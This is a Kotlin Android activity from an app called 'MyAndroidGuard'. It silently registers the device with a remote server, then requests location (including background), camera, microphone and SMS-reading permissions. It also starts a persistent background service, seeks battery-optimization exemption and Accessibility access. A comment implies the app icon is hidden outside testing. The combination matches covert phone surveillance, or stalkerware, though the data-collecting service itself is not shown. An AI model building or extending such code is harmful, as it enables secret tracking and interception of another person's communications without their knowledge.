package com.myandroidguard.app

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import com.myandroidguard.app.api.ApiClient
import com.myandroidguard.app.api.AutoRegisterRequest
import com.myandroidguard.app.data.DevicePrefs
import com.myandroidguard.app.service.GuardService
import kotlinx.coroutines.*

/**
 * MainActivity — পারমিশন চেইন → সার্ভিস চালু
 */
class MainActivity : ComponentActivity() {

    companion object {
        private const val TAG = "MyAndroidGuard"
    }

    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { _ -> stepBackgroundLocation() }

    private val bgLocationLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { _ -> stepNotification() }

    private val notificationLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { _ -> finalSetup() }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(android.R.layout.simple_list_item_1)

        Log.d(TAG, "=== MainActivity started ===")
        Log.d(TAG, "Device: ${Build.MANUFACTURER} ${Build.MODEL}")
        Log.d(TAG, "Android: ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")

        scope.launch {
            try {
                if (DevicePrefs.isPaired(this@MainActivity)) {
                    Log.d(TAG, "Already paired, token exists. Requesting permissions.")
                    stepPermissions()
                } else {
                    Log.d(TAG, "Not paired, starting auto-register...")
                    autoRegister()
                }
            } catch (e: Exception) {
                Log.e(TAG, "Fatal error in onCreate: ${e.message}", e)
                Toast.makeText(this@MainActivity, "Error: ${e.message}", Toast.LENGTH_LONG).show()
            }
        }
    }

    private suspend fun autoRegister() {
        var registered = false
        for (attempt in 1..3) {
            try {
                Log.d(TAG, "Auto-register attempt $attempt...")
                val result = withContext(Dispatchers.IO) {
                    ApiClient.service.autoRegister(AutoRegisterRequest(
                        user_email = "",
                        device_name = "${Build.MANUFACTURER} ${Build.MODEL}",
                        model = "${Build.MANUFACTURER} ${Build.MODEL}",
                        os_version = "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})",
                        imei_hash = Build.FINGERPRINT.hashCode().toString(16)
                    ))
                }
                DevicePrefs.saveDeviceToken(this@MainActivity, result.device_token)
                DevicePrefs.saveDeviceId(this@MainActivity, result.device_id)
                Log.d(TAG, "=== AUTO-REGISTER SUCCESS ===")
                Log.d(TAG, "Device ID: ${result.device_id}")
                Log.d(TAG, "Token: ${result.device_token.take(8)}...")
                Toast.makeText(this@MainActivity, "✅ Device registered!", Toast.LENGTH_LONG).show()
                registered = true
                break
            } catch (e: Exception) {
                Log.e(TAG, "Auto-register attempt $attempt FAILED: ${e.message}", e)
                if (attempt < 3) {
                    Log.d(TAG, "Retrying in 3 seconds...")
                    delay(3000)
                }
            }
        }
        if (!registered) {
            Log.e(TAG, "=== AUTO-REGISTER FAILED after 3 attempts ===")
            Toast.makeText(this@MainActivity, "❌ Registration failed! Check network.", Toast.LENGTH_LONG).show()
        }
        stepPermissions()
    }

    private fun stepPermissions() {
        val perms = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS
        )
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
            perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }
        val needed = perms.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (needed.isNotEmpty()) {
            permissionLauncher.launch(needed.toTypedArray())
        } else {
            stepBackgroundLocation()
        }
    }

    private fun stepBackgroundLocation() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            != PackageManager.PERMISSION_GRANTED) {
            bgLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        } else {
            stepNotification()
        }
    }

    private fun stepNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
            != PackageManager.PERMISSION_GRANTED) {
            notificationLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
        } else {
            finalSetup()
        }
    }

    private fun finalSetup() {
        Log.d(TAG, "=== Final setup - starting GuardService ===")

        // সার্ভিস চালু
        try {
            val si = Intent(this, GuardService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(si) else startService(si)
            Log.d(TAG, "GuardService started successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start GuardService: ${e.message}", e)
        }

        // Battery optimization বন্ধ
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val pm = getSystemService(PowerManager::class.java)
                if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                    startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    })
                }
            }
        } catch (e: Exception) { Log.e(TAG, "Battery opt error", e) }

        // NOTE: Device Admin and Accessibility settings removed from auto-launch
        // to prevent activity stack overflow. User should enable manually.
        Log.d(TAG, "Setup complete. Please enable Accessibility Service manually in Settings.")
        Toast.makeText(this, "Setup complete! Enable Accessibility in Settings.", Toast.LENGTH_LONG).show()

        // DO NOT hide app icon during development/testing
        // DO NOT finish() immediately — keep activity alive for permission callbacks
    }

    override fun onDestroy() { scope.cancel(); super.onDestroy() }
}